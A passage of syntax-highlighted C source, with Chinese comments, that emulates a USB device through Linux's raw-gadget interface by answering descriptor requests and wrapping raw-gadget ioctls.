<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">__atomic_load_n</span><span class="p">(</span><span class="o">&amp;</span><span class="n">usb_devices</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="n">__ATOMIC_ACQUIRE</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">fd</span><span class="p">)</span>
<span class="w">      </span><span class="k">return</span><span class="w"> </span><span class="o">&amp;</span><span class="n">usb_devices</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">index</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">struct</span><span class="w"> </span><span class="nc">vusb_connect_string_descriptor</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">len</span><span class="p">;</span>
<span class="w">  </span><span class="kt">char</span><span class="o">*</span><span class="w"> </span><span class="n">str</span><span class="p">;</span>
<span class="p">}</span><span class="w"> </span><span class="n">__attribute__</span><span class="p">((</span><span class="n">packed</span><span class="p">));</span>

<span class="k">struct</span><span class="w"> </span><span class="nc">vusb_connect_descriptors</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">qual_len</span><span class="p">;</span>
<span class="w">  </span><span class="kt">char</span><span class="o">*</span><span class="w"> </span><span class="n">qual</span><span class="p">;</span>
<span class="w">  </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">bos_len</span><span class="p">;</span>
<span class="w">  </span><span class="kt">char</span><span class="o">*</span><span class="w"> </span><span class="n">bos</span><span class="p">;</span>
<span class="w">  </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">strs_len</span><span class="p">;</span>
<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">vusb_connect_string_descriptor</span><span class="w"> </span><span class="n">strs</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
<span class="p">}</span><span class="w"> </span><span class="n">__attribute__</span><span class="p">((</span><span class="n">packed</span><span class="p">));</span>

<span class="k">static</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="n">default_string</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="mi">8</span><span class="p">,</span><span class="w"> </span><span class="n">USB_DT_STRING</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;s&#39;</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;y&#39;</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;z&#39;</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">};</span>

<span class="k">static</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="n">default_lang_id</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="mi">4</span><span class="p">,</span><span class="w"> </span><span class="n">USB_DT_STRING</span><span class="p">,</span><span class="w"> </span><span class="mh">0x09</span><span class="p">,</span><span class="w"> </span><span class="mh">0x04</span><span class="p">};</span>

<span class="c1">// 处理USB控制请求的输入</span>
<span class="k">static</span><span class="w"> </span><span class="kt">bool</span>
<span class="nf">lookup_connect_response_in</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">vusb_connect_descriptors</span><span class="o">*</span><span class="w"> </span><span class="n">descs</span><span class="p">,</span>
<span class="w">                           </span><span class="k">const</span><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">usb_ctrlrequest</span><span class="o">*</span><span class="w"> </span><span class="n">ctrl</span><span class="p">,</span>
<span class="w">                           </span><span class="k">struct</span><span class="w"> </span><span class="nc">usb_qualifier_descriptor</span><span class="o">*</span><span class="w"> </span><span class="n">qual</span><span class="p">,</span>
<span class="w">                           </span><span class="kt">char</span><span class="o">**</span><span class="w"> </span><span class="n">response_data</span><span class="p">,</span><span class="w"> </span><span class="kt">uint32_t</span><span class="o">*</span><span class="w"> </span><span class="n">response_length</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">usb_device_index</span><span class="o">*</span><span class="w"> </span><span class="n">index</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">lookup_usb_index</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
<span class="w">  </span><span class="kt">uint8_t</span><span class="w"> </span><span class="n">str_idx</span><span class="p">;</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">index</span><span class="p">)</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nb">false</span><span class="p">;</span>
<span class="w">  </span><span class="k">switch</span><span class="w"> </span><span class="p">(</span><span class="n">ctrl</span><span class="o">-&gt;</span><span class="n">bRequestType</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">USB_TYPE_MASK</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="k">case</span><span class="w"> </span><span class="no">USB_TYPE_STANDARD</span><span class="p">:</span>
<span class="w">    </span><span class="k">switch</span><span class="w"> </span><span class="p">(</span><span class="n">ctrl</span><span class="o">-&gt;</span><span class="n">bRequest</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="no">USB_REQ_GET_DESCRIPTOR</span><span class="p">:</span>
<span class="w">      </span><span class="k">switch</span><span class="w"> </span><span class="p">(</span><span class="n">ctrl</span><span class="o">-&gt;</span><span class="n">wValue</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="mi">8</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="k">case</span><span class="w"> </span><span class="no">USB_DT_DEVICE</span><span class="p">:</span>
<span class="w">        </span><span class="o">*</span><span class="n">response_data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">index</span><span class="o">-&gt;</span><span class="n">dev</span><span class="p">;</span>
<span class="w">        </span><span class="o">*</span><span class="n">response_length</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="o">*</span><span class="n">index</span><span class="o">-&gt;</span><span class="n">dev</span><span class="p">);</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nb">true</span><span class="p">;</span>
<span class="w">      </span><span class="k">case</span><span class="w"> </span><span class="no">USB_DT_CONFIG</span><span class="p">:</span>
<span class="w">        </span><span class="o">*</span><span class="n">response_data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">index</span><span class="o">-&gt;</span><span class="n">config</span><span class="p">;</span>
<span class="w">        </span><span class="o">*</span><span class="n">response_length</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">index</span><span class="o">-&gt;</span><span class="n">config_length</span><span class="p">;</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nb">true</span><span class="p">;</span>
<span class="w">      </span><span class="k">case</span><span class="w"> </span><span class="no">USB_DT_STRING</span><span class="p">:</span>
<span class="w">        </span><span class="n">str_idx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">uint8_t</span><span class="p">)</span><span class="n">ctrl</span><span class="o">-&gt;</span><span class="n">wValue</span><span class="p">;</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">descs</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">str_idx</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">descs</span><span class="o">-&gt;</span><span class="n">strs_len</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">          </span><span class="o">*</span><span class="n">response_data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">descs</span><span class="o">-&gt;</span><span class="n">strs</span><span class="p">[</span><span class="n">str_idx</span><span class="p">].</span><span class="n">str</span><span class="p">;</span>
<span class="w">          </span><span class="o">*</span><span class="n">response_length</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">descs</span><span class="o">-&gt;</span><span class="n">strs</span><span class="p">[</span><span class="n">str_idx</span><span class="p">].</span><span class="n">len</span><span class="p">;</span>
<span class="w">          </span><span class="k">return</span><span class="w"> </span><span class="nb">true</span><span class="p">;</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">str_idx</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">          </span><span class="o">*</span><span class="n">response_data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">default_lang_id</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
<span class="w">          </span><span class="o">*</span><span class="n">response_length</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">default_lang_id</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
<span class="w">          </span><span class="k">return</span><span class="w"> </span><span class="nb">true</span><span class="p">;</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">        </span><span class="o">*</span><span class="n">response_data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">default_string</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
<span class="w">        </span><span class="o">*</span><span class="n">response_length</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">default_string</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nb">true</span><span class="p">;</span>
<span class="w">      </span><span class="k">case</span><span class="w"> </span><span class="no">USB_DT_BOS</span><span class="p">:</span>
<span class="w">        </span><span class="o">*</span><span class="n">response_data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">descs</span><span class="o">-&gt;</span><span class="n">bos</span><span class="p">;</span>
<span class="w">        </span><span class="o">*</span><span class="n">response_length</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">descs</span><span class="o">-&gt;</span><span class="n">bos_len</span><span class="p">;</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nb">true</span><span class="p">;</span>
<span class="w">      </span><span class="k">case</span><span class="w"> </span><span class="no">USB_DT_DEVICE_QUALIFIER</span><span class="p">:</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">descs</span><span class="o">-&gt;</span><span class="n">qual</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">          </span><span class="n">qual</span><span class="o">-&gt;</span><span class="n">bLength</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="o">*</span><span class="n">qual</span><span class="p">);</span>
<span class="w">          </span><span class="n">qual</span><span class="o">-&gt;</span><span class="n">bDescriptorType</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">USB_DT_DEVICE_QUALIFIER</span><span class="p">;</span>
<span class="w">          </span><span class="n">qual</span><span class="o">-&gt;</span><span class="n">bcdUSB</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">index</span><span class="o">-&gt;</span><span class="n">dev</span><span class="o">-&gt;</span><span class="n">bcdUSB</span><span class="p">;</span>
<span class="w">          </span><span class="n">qual</span><span class="o">-&gt;</span><span class="n">bDeviceClass</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">index</span><span class="o">-&gt;</span><span class="n">dev</span><span class="o">-&gt;</span><span class="n">bDeviceClass</span><span class="p">;</span>
<span class="w">          </span><span class="n">qual</span><span class="o">-&gt;</span><span class="n">bDeviceSubClass</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">index</span><span class="o">-&gt;</span><span class="n">dev</span><span class="o">-&gt;</span><span class="n">bDeviceSubClass</span><span class="p">;</span>
<span class="w">          </span><span class="n">qual</span><span class="o">-&gt;</span><span class="n">bDeviceProtocol</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">index</span><span class="o">-&gt;</span><span class="n">dev</span><span class="o">-&gt;</span><span class="n">bDeviceProtocol</span><span class="p">;</span>
<span class="w">          </span><span class="n">qual</span><span class="o">-&gt;</span><span class="n">bMaxPacketSize0</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">index</span><span class="o">-&gt;</span><span class="n">dev</span><span class="o">-&gt;</span><span class="n">bMaxPacketSize0</span><span class="p">;</span>
<span class="w">          </span><span class="n">qual</span><span class="o">-&gt;</span><span class="n">bNumConfigurations</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">index</span><span class="o">-&gt;</span><span class="n">dev</span><span class="o">-&gt;</span><span class="n">bNumConfigurations</span><span class="p">;</span>
<span class="w">          </span><span class="n">qual</span><span class="o">-&gt;</span><span class="n">bRESERVED</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="w">          </span><span class="o">*</span><span class="n">response_data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">qual</span><span class="p">;</span>
<span class="w">          </span><span class="o">*</span><span class="n">response_length</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="o">*</span><span class="n">qual</span><span class="p">);</span>
<span class="w">          </span><span class="k">return</span><span class="w"> </span><span class="nb">true</span><span class="p">;</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">        </span><span class="o">*</span><span class="n">response_data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">descs</span><span class="o">-&gt;</span><span class="n">qual</span><span class="p">;</span>
<span class="w">        </span><span class="o">*</span><span class="n">response_length</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">descs</span><span class="o">-&gt;</span><span class="n">qual_len</span><span class="p">;</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nb">true</span><span class="p">;</span>
<span class="w">      </span><span class="k">default</span><span class="o">:</span>
<span class="w">        </span><span class="k">break</span><span class="p">;</span>
<span class="w">      </span><span class="p">}</span>
<span class="w">      </span><span class="k">break</span><span class="p">;</span>
<span class="w">    </span><span class="k">default</span><span class="o">:</span>
<span class="w">      </span><span class="k">break</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="k">break</span><span class="p">;</span>
<span class="w">  </span><span class="k">default</span><span class="o">:</span>
<span class="w">    </span><span class="k">break</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="nb">false</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">typedef</span><span class="w"> </span><span class="kt">bool</span><span class="w"> </span><span class="p">(</span><span class="o">*</span><span class="n">lookup_connect_out_response_t</span><span class="p">)(</span>
<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">vusb_connect_descriptors</span><span class="o">*</span><span class="w"> </span><span class="n">descs</span><span class="p">,</span>
<span class="w">    </span><span class="k">const</span><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">usb_ctrlrequest</span><span class="o">*</span><span class="w"> </span><span class="n">ctrl</span><span class="p">,</span><span class="w"> </span><span class="kt">bool</span><span class="o">*</span><span class="w"> </span><span class="n">done</span><span class="p">);</span>


<span class="c1">// 处理USB控制请求的输出</span>
<span class="k">static</span><span class="w"> </span><span class="kt">bool</span><span class="w"> </span><span class="nf">lookup_connect_response_out_generic</span><span class="p">(</span>
<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">vusb_connect_descriptors</span><span class="o">*</span><span class="w"> </span><span class="n">descs</span><span class="p">,</span>
<span class="w">    </span><span class="k">const</span><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">usb_ctrlrequest</span><span class="o">*</span><span class="w"> </span><span class="n">ctrl</span><span class="p">,</span><span class="w"> </span><span class="kt">bool</span><span class="o">*</span><span class="w"> </span><span class="n">done</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">  </span><span class="k">switch</span><span class="w"> </span><span class="p">(</span><span class="n">ctrl</span><span class="o">-&gt;</span><span class="n">bRequestType</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">USB_TYPE_MASK</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="k">case</span><span class="w"> </span><span class="no">USB_TYPE_STANDARD</span><span class="p">:</span>
<span class="w">    </span><span class="k">switch</span><span class="w"> </span><span class="p">(</span><span class="n">ctrl</span><span class="o">-&gt;</span><span class="n">bRequest</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="no">USB_REQ_SET_CONFIGURATION</span><span class="p">:</span>
<span class="w">      </span><span class="o">*</span><span class="n">done</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">true</span><span class="p">;</span>
<span class="w">      </span><span class="k">return</span><span class="w"> </span><span class="nb">true</span><span class="p">;</span>
<span class="w">    </span><span class="k">default</span><span class="o">:</span>
<span class="w">      </span><span class="k">break</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="k">break</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="nb">false</span><span class="p">;</span>
<span class="p">}</span>

<span class="cp">#define UDC_NAME_LENGTH_MAX 128</span>

<span class="c1">// usb_raw_*   函数：与  /dev/raw-gadget  设备文件通信，模拟USB设备的行为</span>
<span class="k">struct</span><span class="w"> </span><span class="nc">usb_raw_init</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="n">__u8</span><span class="w"> </span><span class="n">driver_name</span><span class="p">[</span><span class="n">UDC_NAME_LENGTH_MAX</span><span class="p">];</span>
<span class="w">  </span><span class="n">__u8</span><span class="w"> </span><span class="n">device_name</span><span class="p">[</span><span class="n">UDC_NAME_LENGTH_MAX</span><span class="p">];</span>
<span class="w">  </span><span class="n">__u8</span><span class="w"> </span><span class="n">speed</span><span class="p">;</span>
<span class="p">};</span>

<span class="k">enum</span><span class="w"> </span><span class="nc">usb_raw_event_type</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="n">USB_RAW_EVENT_INVALID</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span>
<span class="w">  </span><span class="n">USB_RAW_EVENT_CONNECT</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span>
<span class="w">  </span><span class="n">USB_RAW_EVENT_CONTROL</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">2</span><span class="p">,</span>
<span class="p">};</span>

<span class="k">struct</span><span class="w"> </span><span class="nc">usb_raw_event</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="n">__u32</span><span class="w"> </span><span class="n">type</span><span class="p">;</span>
<span class="w">  </span><span class="n">__u32</span><span class="w"> </span><span class="n">length</span><span class="p">;</span>
<span class="w">  </span><span class="n">__u8</span><span class="w"> </span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
<span class="p">};</span>

<span class="k">struct</span><span class="w"> </span><span class="nc">usb_raw_ep_io</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="n">__u16</span><span class="w"> </span><span class="n">ep</span><span class="p">;</span>
<span class="w">  </span><span class="n">__u16</span><span class="w"> </span><span class="n">flags</span><span class="p">;</span>
<span class="w">  </span><span class="n">__u32</span><span class="w"> </span><span class="n">length</span><span class="p">;</span>
<span class="w">  </span><span class="n">__u8</span><span class="w"> </span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
<span class="p">};</span>

<span class="cp">#define USB_RAW_EPS_NUM_MAX 30</span>
<span class="cp">#define USB_RAW_EP_NAME_MAX 16</span>
<span class="cp">#define USB_RAW_EP_ADDR_ANY 0xff</span>

<span class="k">struct</span><span class="w"> </span><span class="nc">usb_raw_ep_caps</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="n">__u32</span><span class="w"> </span><span class="n">type_control</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
<span class="w">  </span><span class="n">__u32</span><span class="w"> </span><span class="n">type_iso</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
<span class="w">  </span><span class="n">__u32</span><span class="w"> </span><span class="n">type_bulk</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
<span class="w">  </span><span class="n">__u32</span><span class="w"> </span><span class="n">type_int</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
<span class="w">  </span><span class="n">__u32</span><span class="w"> </span><span class="n">dir_in</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
<span class="w">  </span><span class="n">__u32</span><span class="w"> </span><span class="n">dir_out</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
<span class="p">};</span>

<span class="k">struct</span><span class="w"> </span><span class="nc">usb_raw_ep_limits</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="n">__u16</span><span class="w"> </span><span class="n">maxpacket_limit</span><span class="p">;</span>
<span class="w">  </span><span class="n">__u16</span><span class="w"> </span><span class="n">max_streams</span><span class="p">;</span>
<span class="w">  </span><span class="n">__u32</span><span class="w"> </span><span class="n">reserved</span><span class="p">;</span>
<span class="p">};</span>

<span class="k">struct</span><span class="w"> </span><span class="nc">usb_raw_ep_info</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="n">__u8</span><span class="w"> </span><span class="n">name</span><span class="p">[</span><span class="n">USB_RAW_EP_NAME_MAX</span><span class="p">];</span>
<span class="w">  </span><span class="n">__u32</span><span class="w"> </span><span class="n">addr</span><span class="p">;</span>
<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">usb_raw_ep_caps</span><span class="w"> </span><span class="n">caps</span><span class="p">;</span>
<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">usb_raw_ep_limits</span><span class="w"> </span><span class="n">limits</span><span class="p">;</span>
<span class="p">};</span>

<span class="k">struct</span><span class="w"> </span><span class="nc">usb_raw_eps_info</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">usb_raw_ep_info</span><span class="w"> </span><span class="n">eps</span><span class="p">[</span><span class="n">USB_RAW_EPS_NUM_MAX</span><span class="p">];</span>
<span class="p">};</span>

<span class="cp">#define USB_RAW_IOCTL_INIT _IOW(&#39;U&#39;, 0, struct usb_raw_init)</span>
<span class="cp">#define USB_RAW_IOCTL_RUN _IO(&#39;U&#39;, 1)</span>
<span class="cp">#define USB_RAW_IOCTL_EVENT_FETCH _IOR(&#39;U&#39;, 2, struct usb_raw_event)</span>
<span class="cp">#define USB_RAW_IOCTL_EP0_WRITE _IOW(&#39;U&#39;, 3, struct usb_raw_ep_io)</span>
<span class="cp">#define USB_RAW_IOCTL_EP0_READ _IOWR(&#39;U&#39;, 4, struct usb_raw_ep_io)</span>
<span class="cp">#define USB_RAW_IOCTL_EP_ENABLE _IOW(&#39;U&#39;, 5, struct usb_endpoint_descriptor)</span>
<span class="cp">#define USB_RAW_IOCTL_EP_DISABLE _IOW(&#39;U&#39;, 6, __u32)</span>
<span class="cp">#define USB_RAW_IOCTL_EP_WRITE _IOW(&#39;U&#39;, 7, struct usb_raw_ep_io)</span>
<span class="cp">#define USB_RAW_IOCTL_EP_READ _IOWR(&#39;U&#39;, 8, struct usb_raw_ep_io)</span>
<span class="cp">#define USB_RAW_IOCTL_CONFIGURE _IO(&#39;U&#39;, 9)</span>
<span class="cp">#define USB_RAW_IOCTL_VBUS_DRAW _IOW(&#39;U&#39;, 10, __u32)</span>
<span class="cp">#define USB_RAW_IOCTL_EPS_INFO _IOR(&#39;U&#39;, 11, struct usb_raw_eps_info)</span>
<span class="cp">#define USB_RAW_IOCTL_EP0_STALL _IO(&#39;U&#39;, 12)</span>
<span class="cp">#define USB_RAW_IOCTL_EP_SET_HALT _IOW(&#39;U&#39;, 13, __u32)</span>
<span class="cp">#define USB_RAW_IOCTL_EP_CLEAR_HALT _IOW(&#39;U&#39;, 14, __u32)</span>
<span class="cp">#define USB_RAW_IOCTL_EP_SET_WEDGE _IOW(&#39;U&#39;, 15, __u32)</span>

<span class="k">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">usb_raw_open</span><span class="p">()</span>
<span class="p">{</span>
<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="n">open</span><span class="p">(</span><span class="s">&quot;/dev/raw-gadget&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">O_RDWR</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">usb_raw_init</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">speed</span><span class="p">,</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="o">*</span><span class="w"> </span><span class="n">driver</span><span class="p">,</span>
<span class="w">                        </span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="o">*</span><span class="w"> </span><span class="n">device</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">usb_raw_init</span><span class="w"> </span><span class="n">arg</span><span class="p">;</span>
<span class="w">  </span><span class="n">strncpy</span><span class="p">((</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">arg</span><span class="p">.</span><span class="n">driver_name</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="w"> </span><span class="n">driver</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">arg</span><span class="p">.</span><span class="n">driver_name</span><span class="p">));</span>
<span class="w">  </span><span class="n">strncpy</span><span class="p">((</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">arg</span><span class="p">.</span><span class="n">device_name</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="w"> </span><span class="n">device</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">arg</span><span class="p">.</span><span class="n">device_name</span><span class="p">));</span>
<span class="w">  </span><span class="n">arg</span><span class="p">.</span><span class="n">speed</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">speed</span><span class="p">;</span>
<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="n">USB_RAW_IOCTL_INIT</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">arg</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">usb_raw_run</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">fd</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="n">USB_RAW_IOCTL_RUN</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">usb_raw_event_fetch</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">usb_raw_event</span><span class="o">*</span><span class="w"> </span><span class="n">event</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="n">USB_RAW_IOCTL_EVENT_FETCH</span><span class="p">,</span><span class="w"> </span><span class="n">event</span><span class="p">);</span>
<span class="p">}</span>

